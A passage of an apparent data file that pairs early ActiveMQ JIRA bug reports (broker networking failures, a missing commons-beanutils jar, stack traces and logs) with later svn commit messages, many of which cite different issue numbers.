        at org.codehaus.activemq.transport.TransportChannelFactorySupport.populateProperties(TransportChannelFactorySupport.java:55)
        at org.codehaus.activemq.transport.reliable.ReliableTransportChannelFactory.create(ReliableTransportChannelFactory.java:51)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createTransportChannel(ActiveMQConnectionFactory.java:748)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:539)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:529)
        at org.codehaus.activemq.tool.ToolSupport.createConnection(ToolSupport.java:68)
        at org.codehaus.activemq.tool.ConsumerTool.run(ConsumerTool.java:76)
        at org.codehaus.activemq.tool.ConsumerTool.main(ConsumerTool.java:67)",e38da226ef41e31d363102c744c351b540098856,"apply fix for https://issues.apache.org/activemq/browse/AMQ-1810

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669511 13f79535-47bb-0310-9956-ffa450edef68"
12481157,AMQ-181,"The binary distribution unit is missing the commons-beanutils-1.6.1.jar file.  This file is specified as a dependancy in core.  It needed when a client specifies parameters in a connection URL.


Connecting to URL: reliable:tcp://localhost:61616?keepAliveTimeout=60000
Consuming topic: TOOL.DEFAULT
Using non-durable subscription
2005-01-25 18:21:20,094 [main           ] DEBUG BeanUtils                      - Cannot find: org.apache.commons.beanutils.BeanUtils. Reason: java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
        at java.net.URLClassLoader$1.run(URLClassLoader.java:199)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:187)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:289)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:274)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:235)
        at org.codehaus.activemq.util.BeanUtils.populate(BeanUtils.java:41)
        at org.codehaus.activemq.transport.TransportChannelFactorySupport.populateProperties(TransportChannelFactorySupport.java:55)
        at org.codehaus.activemq.transport.reliable.ReliableTransportChannelFactory.create(ReliableTransportChannelFactory.java:51)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createTransportChannel(ActiveMQConnectionFactory.java:748)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:539)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:529)
        at org.codehaus.activemq.tool.ToolSupport.createConnection(ToolSupport.java:68)
        at org.codehaus.activemq.tool.ConsumerTool.run(ConsumerTool.java:76)
        at org.codehaus.activemq.tool.ConsumerTool.main(ConsumerTool.java:67)",4bbfe2e9a8278aedf9b71ca1f4ac4f37bdc65385,"Fix for https://issues.apache.org/activemq/browse/AMQ-1812

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669545 13f79535-47bb-0310-9956-ffa450edef68"
12481157,AMQ-181,"The binary distribution unit is missing the commons-beanutils-1.6.1.jar file.  This file is specified as a dependancy in core.  It needed when a client specifies parameters in a connection URL.


Connecting to URL: reliable:tcp://localhost:61616?keepAliveTimeout=60000
Consuming topic: TOOL.DEFAULT
Using non-durable subscription
2005-01-25 18:21:20,094 [main           ] DEBUG BeanUtils                      - Cannot find: org.apache.commons.beanutils.BeanUtils. Reason: java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanUtils
        at java.net.URLClassLoader$1.run(URLClassLoader.java:199)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:187)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:289)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:274)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:235)
        at org.codehaus.activemq.util.BeanUtils.populate(BeanUtils.java:41)
        at org.codehaus.activemq.transport.TransportChannelFactorySupport.populateProperties(TransportChannelFactorySupport.java:55)
        at org.codehaus.activemq.transport.reliable.ReliableTransportChannelFactory.create(ReliableTransportChannelFactory.java:51)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createTransportChannel(ActiveMQConnectionFactory.java:748)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:539)
        at org.codehaus.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:529)
        at org.codehaus.activemq.tool.ToolSupport.createConnection(ToolSupport.java:68)
        at org.codehaus.activemq.tool.ConsumerTool.run(ConsumerTool.java:76)
        at org.codehaus.activemq.tool.ConsumerTool.main(ConsumerTool.java:67)",24f73a53c12b71d6006b1b2a283c5f388ed15e20,"Fix for: https://issues.apache.org/activemq/browse/AMQ-1817

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@906101 13f79535-47bb-0310-9956-ffa450edef68"
12481146,AMQ-180,"I have confirmed that while a temporary destination is propgated between broker instances across NetworkChannels, it is happening to late to work for request/reply (RPC) operations.

To test two brokers are required to be interconnected.  Attach to broker1 a ""replier"" process and on broker2 a ""requestor"" process.

The replier process need only send back a reply message on the ""replyTo"" destination contained in the received message.


The requestor process performs the following steps:

1) create temporary topic
2) create producer topic TOOL.DEFAULT
3) create consumer topic from step 1
4) producer send msg
5) consumer receive msg

Broker1 log show that the registration of the consumer for the temporary topic arrives after the message is received from the producer.  The result is an exception condition that the destination is no longer valid because the client no longer exists.

Given the order of execution, I suspect one of the follow problems:

a) registration of a consumer is happening at the time the first receive() is executed and not when the consumer is created.

b) network propogation of consumers is done in background thread.",1acfd0d6074f037b6ecf85fe2840ca58902c503b,"Fix for https://issues.apache.org/activemq/browse/AMQ-1805

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669519 13f79535-47bb-0310-9956-ffa450edef68"
12481146,AMQ-180,"I have confirmed that while a temporary destination is propgated between broker instances across NetworkChannels, it is happening to late to work for request/reply (RPC) operations.

To test two brokers are required to be interconnected.  Attach to broker1 a ""replier"" process and on broker2 a ""requestor"" process.

The replier process need only send back a reply message on the ""replyTo"" destination contained in the received message.


The requestor process performs the following steps:

1) create temporary topic
2) create producer topic TOOL.DEFAULT
3) create consumer topic from step 1
4) producer send msg
5) consumer receive msg

Broker1 log show that the registration of the consumer for the temporary topic arrives after the message is received from the producer.  The result is an exception condition that the destination is no longer valid because the client no longer exists.

Given the order of execution, I suspect one of the follow problems:

a) registration of a consumer is happening at the time the first receive() is executed and not when the consumer is created.

b) network propogation of consumers is done in background thread.",d8a0ca2fedae4384abc47ffc8fc309d4b862ce32,"Fix for https://issues.apache.org/activemq/browse/AMQ-1804

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669555 13f79535-47bb-0310-9956-ffa450edef68"
12481146,AMQ-180,"I have confirmed that while a temporary destination is propgated between broker instances across NetworkChannels, it is happening to late to work for request/reply (RPC) operations.

To test two brokers are required to be interconnected.  Attach to broker1 a ""replier"" process and on broker2 a ""requestor"" process.

The replier process need only send back a reply message on the ""replyTo"" destination contained in the received message.


The requestor process performs the following steps:

1) create temporary topic
2) create producer topic TOOL.DEFAULT
3) create consumer topic from step 1
4) producer send msg
5) consumer receive msg

Broker1 log show that the registration of the consumer for the temporary topic arrives after the message is received from the producer.  The result is an exception condition that the destination is no longer valid because the client no longer exists.

Given the order of execution, I suspect one of the follow problems:

a) registration of a consumer is happening at the time the first receive() is executed and not when the consumer is created.

b) network propogation of consumers is done in background thread.",a15e6efabd94fd74fcdd28c3326f3096b9b7bbec,"https://issues.apache.org/activemq/browse/AMQ-1807 - aborting transaction test revisited + solution

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@804192 13f79535-47bb-0310-9956-ffa450edef68"
12481170,AMQ-173,"I am testing a setup where two brokers are networked in a site. This is done to provided but load balancing and high availablity.  However I have found a bug that prevents this configuration for both purposes.  In short if one of the broker fails for any length of time, the remain broker can never re-establish a proper link back to the restored broker.  The following steps to duplicate this problem.


Topology: 2 brokers
               broker1 port=61616, network channel=62626
               broker2 port=62626, network channel=61616
          1 consumer connects to 61616
			 1 producer connects to 62626
			 

Test procedure:

1) start broker1 and broker2
   log shows that both brokers establish network channels to the other
	
2) start consumer
	log for broker1 show client connection and forward of destination registration to broker2
	log for broker2 show receipt of destination registration
	 
3) start producer
   log for broker2 shows client connection and discconection when producer terminates
	log for broker1 shows forwarded messages for consumer received from broker2
	
4) stop broker2
   log for broker2 shows shutdown
	log for broker1 show broker2 disconnect, but also errors when trying to send keepalive
	
5) stop consumer

6) wait 2+ minutes, wait for ""NetworkChannel - stopped MetworkMessageBridge for destination:"" in broker1 log

7) start broker2
   log for broker1 shows establishment of network channel for broker2, but broker2 log does not corresponding broker1 network channel registration
	
8) start consumer
   log for broker 1 show error in attempt to establish NetworkMessageBridge for destination
	
9) start producter
   log for broker2 shows client connection and discconection when producer terminates
	log for broker1 shows NO forwarded messages",b609bdb95b23e658b2704425f0f6319db56ac962,"AMQ-1733: Add an option to allow the xbean broker to destroy the spring application context when the broker is stopped

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@657059 13f79535-47bb-0310-9956-ffa450edef68"
12481170,AMQ-173,"I am testing a setup where two brokers are networked in a site. This is done to provided but load balancing and high availablity.  However I have found a bug that prevents this configuration for both purposes.  In short if one of the broker fails for any length of time, the remain broker can never re-establish a proper link back to the restored broker.  The following steps to duplicate this problem.


Topology: 2 brokers
               broker1 port=61616, network channel=62626
               broker2 port=62626, network channel=61616
          1 consumer connects to 61616
			 1 producer connects to 62626
			 

Test procedure:

1) start broker1 and broker2
   log shows that both brokers establish network channels to the other
	
2) start consumer
	log for broker1 show client connection and forward of destination registration to broker2
	log for broker2 show receipt of destination registration
	 
3) start producer
   log for broker2 shows client connection and discconection when producer terminates
	log for broker1 shows forwarded messages for consumer received from broker2
	
4) stop broker2
   log for broker2 shows shutdown
	log for broker1 show broker2 disconnect, but also errors when trying to send keepalive
	
5) stop consumer

6) wait 2+ minutes, wait for ""NetworkChannel - stopped MetworkMessageBridge for destination:"" in broker1 log

7) start broker2
   log for broker1 shows establishment of network channel for broker2, but broker2 log does not corresponding broker1 network channel registration
	
8) start consumer
   log for broker 1 show error in attempt to establish NetworkMessageBridge for destination
	
9) start producter
   log for broker2 shows client connection and discconection when producer terminates
	log for broker1 shows NO forwarded messages",ff46232797ee38d248c64e69a5122d3ae68e3703,"Fix for: https://issues.apache.org/activemq/browse/AMQ-1738
Messages stuck in a queue don't get dispatch (happens when consumers close out)


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@658370 13f79535-47bb-0310-9956-ffa450edef68"
12481115,AMQ-171,When you do a connection.destroyDestination(dest) it seems like it works but if you add a subscriber to the dest then all the messages existed in the destination before the destory get delivered.,90c8ded77131dd848eac5290e966962fbe5c30ed,"Fix for https://issues.apache.org/activemq/browse/AMQ-1717

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@658127 13f79535-47bb-0310-9956-ffa450edef68"
12481155,AMQ-169,Creating an MDB that is a durable subscriber does not work.,22c63e65c782b9a95f1ed35e38f7b767fedcfdca,"Fix for AMQ-1691 and AMQ-1694

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@652121 13f79535-47bb-0310-9956-ffa450edef68"
12481155,AMQ-169,Creating an MDB that is a durable subscriber does not work.,290f51a1eb3ad92b8d3413f07a7f27856d05980a,"Fix for https://issues.apache.org/activemq/browse/AMQ-1699

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@652440 13f79535-47bb-0310-9956-ffa450edef68"
12481160,AMQ-168,"Here's the scenario:
B1 (Broker 1)
B2 (Broker 2)
B3 (Broker 3)

Q1 (Queue 1)
T1 (Topic 1)

QC1 (Queue Consumer 1)
QP1 (Queue Producer 1)
TC1 (Topic Consumer 1)

B1 <-> B2 <-> B3 <-> B1  (All the brokers are connected)

QC1 -> B1  (QC1 connected to B1)
QP1 -> B2  (QP1 connected to B2)
TC1 -> B3  (TC1 connected to B3)

QP1 sends 10 messages to Q1  
QC1 receives only 5 messages from Q1",6c86745810097ce151caf181bcc33b96ce23d064,"Test case for https://issues.apache.org/activemq/browse/AMQ-1687

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@812873 13f79535-47bb-0310-9956-ffa450edef68"
12481114,AMQ-166,"TransportChannelSupport have concurrent problem. Sometimes activemq warnning this message. --> ""No Packet found to match Receipt correlationId"". TransportChannelSupport's member field ""sessionList"" does not thread safe. How about change the field type from java.util.HashMap to java.util.Hashtable. 

And I have a question. 
How to know the pending message count in Queue or Topic in jms client application. How to use JMS management function.",18aa1596a23204ee633ace18b63e8d2323c389b1,"Apply patch for https://issues.apache.org/activemq/browse/AMQ-1666

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@649191 13f79535-47bb-0310-9956-ffa450edef68"
12481114,AMQ-166,"TransportChannelSupport have concurrent problem. Sometimes activemq warnning this message. --> ""No Packet found to match Receipt correlationId"". TransportChannelSupport's member field ""sessionList"" does not thread safe. How about change the field type from java.util.HashMap to java.util.Hashtable. 

And I have a question. 
How to know the pending message count in Queue or Topic in jms client application. How to use JMS management function.",6707ac60ccf85e51f33cb4f614ce72cec5930ba2,"Apply patch from https://issues.apache.org/activemq/browse/AMQ-1664

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@649192 13f79535-47bb-0310-9956-ffa450edef68"
12481289,AMQ-161,"Here's the scenario:

B1 = Broker 1
B2 = Broker 2
R1 = Polling Message consumer connected to B1
R2 = Polling Message consumer connected to B2
S1 = Message producer connected to B1

B1 and B2 are started -- they find each other and ""hookup""
R1 and R2 are started -- they connect and call receive() on Q
S1 is started -- connects and sends 10 messages to Q.

R1 receives messages: 0,2,4,6,8
R2 receives messages: 1,3,5,7,9

Restart R1 (complete shutdown of JVM)  --- here's where the bug starts showing

R1 receives messages: 3,7
R2 receives messages: 1,5,9

Restart R2 (complete shutdown of JVM)  --- nothing happens (no
messages are redelivered)

Restart R1

R1 receives messages: 5
R2 receives messages: 1,9

Restart R1

R1 receives messages: 9
R2 receives messages: 1

Restart R1

R1 receives messages: <nothing>
R2 receives messages: 1

And if you keep restarting R1 the final loop happens over and over again.

I'll attach a sample with instructions on how to run it.",eed43a8f055e5073ef01dfe8d342eeba5ab58b82,"Patch for https://issues.apache.org/activemq/browse/AMQ-1614

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@692178 13f79535-47bb-0310-9956-ffa450edef68"
12481289,AMQ-161,"Here's the scenario:

B1 = Broker 1
B2 = Broker 2
R1 = Polling Message consumer connected to B1
R2 = Polling Message consumer connected to B2
S1 = Message producer connected to B1

B1 and B2 are started -- they find each other and ""hookup""
R1 and R2 are started -- they connect and call receive() on Q
S1 is started -- connects and sends 10 messages to Q.

R1 receives messages: 0,2,4,6,8
R2 receives messages: 1,3,5,7,9

Restart R1 (complete shutdown of JVM)  --- here's where the bug starts showing

R1 receives messages: 3,7
R2 receives messages: 1,5,9

Restart R2 (complete shutdown of JVM)  --- nothing happens (no
messages are redelivered)

Restart R1

R1 receives messages: 5
R2 receives messages: 1,9

Restart R1

R1 receives messages: 9
R2 receives messages: 1

Restart R1

R1 receives messages: <nothing>
R2 receives messages: 1

And if you keep restarting R1 the final loop happens over and over again.

I'll attach a sample with instructions on how to run it.",39d6f49b26e5e809ca8ebabfd51804c7166639e2,"Fix for https://issues.apache.org/activemq/browse/AMQ-1614

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@799530 13f79535-47bb-0310-9956-ffa450edef68"
12481018,AMQ-160,"I tried this:

1. Setup a broker using tcp-transport on one machine
2. Start a client using reliable transport and a client id on another machine (same LAN)
3. Pull the network plug on the client
 - Client connection is terminated on the client side
 - Broker doesn't notice
4. Plug the client back into the network
 - Reliable connection reconnects
 - Broker throws InvalideClientIDException
5. Send a message to the Broker
 - Client disconnect is detected by the broker and client is removed
6. Reconnect client
 - Works now

Possible solutions from the top of my head:

1. When connecting with duplicate client ids, kick the existing client out (could lead to pseudo-race conditions if clients are incorrectly configured to use duplicate ids and reliable is enabled)
2. Do an explicit, syncrhonized keepalive packet send on the existing connection when a duplicate client connects, if the existing client is down, kick it and allow the new client to connect, otherwise do as normal

Number 2 is probably best and I'll implement it if you agree that this is a reasonable solution.",c338d3e0e5212e0d324ec115063b1a8bfc6f6e03,"Patch applied for https://issues.apache.org/activemq/browse/AMQ-1607

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646286 13f79535-47bb-0310-9956-ffa450edef68"
12481213,AMQ-155,"The perforamnce of 1.3 is less than 50% of that of 1.2 version. 

On a small windows test platform ActiveMQ 1.2 is producing about 1024 messages per second and consuming the same. About 2000 msgs per second on a single processor.

ActiveMQ 1.3 dropped into the same environment averages 472 msgs pers second or about 900 msgs produced/consumed on the same processor. While that figure is still good performance it is a significant loss.",5361df13dc6da19748988d18d860b0c7576f6862,"added a little helper factory bean for https://issues.apache.org/activemq/browse/AMQ-1552 to allow easy failover configuration without explicit URI magic

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@612824 13f79535-47bb-0310-9956-ffa450edef68"
12481117,AMQ-154,"The test was created by using the ActiveMQ benchmark and looping it repeatedly. The client socket is closing over a week end. Evidiently a time out occurs about 4 or 5 hours into the test.


2004-12-09 16:54:25,792 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3917-1102632865323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3918,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  TcpTransportChannel            -
 The socket peer is now closed
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(5670411) : TcpTransportChannel: So
cket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] WARN  BrokerContainerImpl            -
 No clientID available for client: brokerConnector-client:(5670411) : TcpTranspo
rtChannel: Socket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 17:03:34,807 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3946-1102633414573-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3947,localport=61616]
2004-12-09 17:04:00,573 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 54
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 48
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 49
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 53
Exception in thread ""TcpTransportChannel: Socket[addr=/127.0.0.1,port=3947,local
port=61616]"" java.lang.NegativeArraySizeException
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:294)
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:159)
        at org.codehaus.activemq.transport.tcp.TcpTransportChannel.run(TcpTransp
ortChannel.java:294)
        at java.lang.Thread.run(Thread.java:595)
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(17477791) ID:doodah-3950-110
2633440323-1:0: TcpTransportChannel: Socket[addr=/127.0.0.1,port=3951,localport=
61616]
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]",3163d48eb16ac141bd88acda17a582f7167750c6,"applied patch for https://issues.apache.org/activemq/browse/AMQ-1542

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@610432 13f79535-47bb-0310-9956-ffa450edef68"
12481117,AMQ-154,"The test was created by using the ActiveMQ benchmark and looping it repeatedly. The client socket is closing over a week end. Evidiently a time out occurs about 4 or 5 hours into the test.


2004-12-09 16:54:25,792 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3917-1102632865323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3918,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  TcpTransportChannel            -
 The socket peer is now closed
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(5670411) : TcpTransportChannel: So
cket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] WARN  BrokerContainerImpl            -
 No clientID available for client: brokerConnector-client:(5670411) : TcpTranspo
rtChannel: Socket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 17:03:34,807 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3946-1102633414573-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3947,localport=61616]
2004-12-09 17:04:00,573 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 54
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 48
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 49
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 53
Exception in thread ""TcpTransportChannel: Socket[addr=/127.0.0.1,port=3947,local
port=61616]"" java.lang.NegativeArraySizeException
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:294)
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:159)
        at org.codehaus.activemq.transport.tcp.TcpTransportChannel.run(TcpTransp
ortChannel.java:294)
        at java.lang.Thread.run(Thread.java:595)
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(17477791) ID:doodah-3950-110
2633440323-1:0: TcpTransportChannel: Socket[addr=/127.0.0.1,port=3951,localport=
61616]
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]",049ce286c74a8049e35e6c8393eeaba28c5db7e7,"Fix for http://issues.apache.org/activemq/browse/AMQ-1542


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@656679 13f79535-47bb-0310-9956-ffa450edef68"
12481117,AMQ-154,"The test was created by using the ActiveMQ benchmark and looping it repeatedly. The client socket is closing over a week end. Evidiently a time out occurs about 4 or 5 hours into the test.


2004-12-09 16:54:25,792 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3917-1102632865323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3918,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  TcpTransportChannel            -
 The socket peer is now closed
2004-12-09 16:55:02,323 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(5670411) : TcpTransportChannel: So
cket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 16:55:02,323 [ocalport=61616]] WARN  BrokerContainerImpl            -
 No clientID available for client: brokerConnector-client:(5670411) : TcpTranspo
rtChannel: Socket[addr=/127.0.0.1,port=3921,localport=61616]
2004-12-09 17:03:34,807 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3946-1102633414573-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3947,localport=61616]
2004-12-09 17:04:00,573 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Adding new client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTran
sportChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 54
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 48
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 49
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 51
2004-12-09 19:23:40,448 [ocalport=61616]] ERROR DefaultWireFormat              -
 Could not find PacketReader for packet type: UNKNOWN PACKET TYPE: 53
Exception in thread ""TcpTransportChannel: Socket[addr=/127.0.0.1,port=3947,local
port=61616]"" java.lang.NegativeArraySizeException
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:294)
        at org.codehaus.activemq.io.impl.DefaultWireFormat.readPacket(DefaultWir
eFormat.java:159)
        at org.codehaus.activemq.transport.tcp.TcpTransportChannel.run(TcpTransp
ortChannel.java:294)
        at java.lang.Thread.run(Thread.java:595)
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerClientImpl               -
 Client disconnected: brokerConnector-client:(17477791) ID:doodah-3950-110
2633440323-1:0: TcpTransportChannel: Socket[addr=/127.0.0.1,port=3951,localport=
61616]
2004-12-13 10:05:15,984 [ocalport=61616]] INFO  BrokerContainerImpl            -
 Removing client: ID:doodah-3950-1102633440323-1:0 on transport: TcpTransp
ortChannel: Socket[addr=/127.0.0.1,port=3951,localport=61616]",98904794786db2e4d98a2784c562e0fd0b3f97bf,"https://issues.apache.org/activemq/browse/AMQ-1547 - adding activemq-core test jar

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@941703 13f79535-47bb-0310-9956-ffa450edef68"
12481342,AMQ-152,"Test :
running the MDB tests (activemq-jboss-test / panacya-mdb-test-1.0.jar) described at http://docs.codehaus.org/display/ACTIVEMQ/JBoss+Integration

1) launching 
 maven sendt (send on a topic)

=> seems to work fine at the first call (at least no exception, but a strange message on Jboss) :
14:40:22,265 WARN  [ServerSessionImpl] Local transaction had not been commited. Commiting now.

2) lauching a second time throws an exception (see stack trace)
This problem occurs sometimes on the simple test queue too,(not in activeMQ 1.4) when launching many time maven sendq. It seems related to transaction. It occurs on all version 1.2, 1.3, 1.4 snapshot)


Here is the complete trace on Jboss :


14:46:41,187 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.SimpleM
essageReceiverBean
14:46:41,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.setMess
ageDrivenContext
14:46:41,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.ejbCrea
te
14:46:41,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.onMessa
ge
14:46:41,203 INFO  [SimpleMessageReceiverBean] Message received: hello ActiveMQ
world
14:46:41,203 INFO  [SenderClient] Looking up Sender: java:comp/env/ejb/Sender
14:46:41,234 INFO  [SenderClient] Sending message: hello ActiveMQ world
14:46:41,375 INFO  [SenderClient] Message sent
14:46:41,375 INFO  [SimpleMessageReceiverBean] Begin delay...
14:46:46,375 INFO  [SimpleMessageReceiverBean] ...end delay
>> THE STRANGE MESSAGE...
14:46:46,375 WARN  [ServerSessionImpl] Local transaction had not been commited.
 Commiting now.
14:47:03,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.SimpleM
essageReceiverBean
14:47:03,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.setMess
ageDrivenContext
14:47:03,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.ejbCrea
te
14:47:03,203 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.onMessa
ge
14:47:03,203 INFO  [SimpleMessageReceiverBean] Message received: hello ActiveMQ
world
14:47:03,203 INFO  [SenderClient] Looking up Sender: java:comp/env/ejb/Sender
14:47:03,203 INFO  [SenderClient] Sending message: hello ActiveMQ world
14:47:03,250 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.onMessa
ge
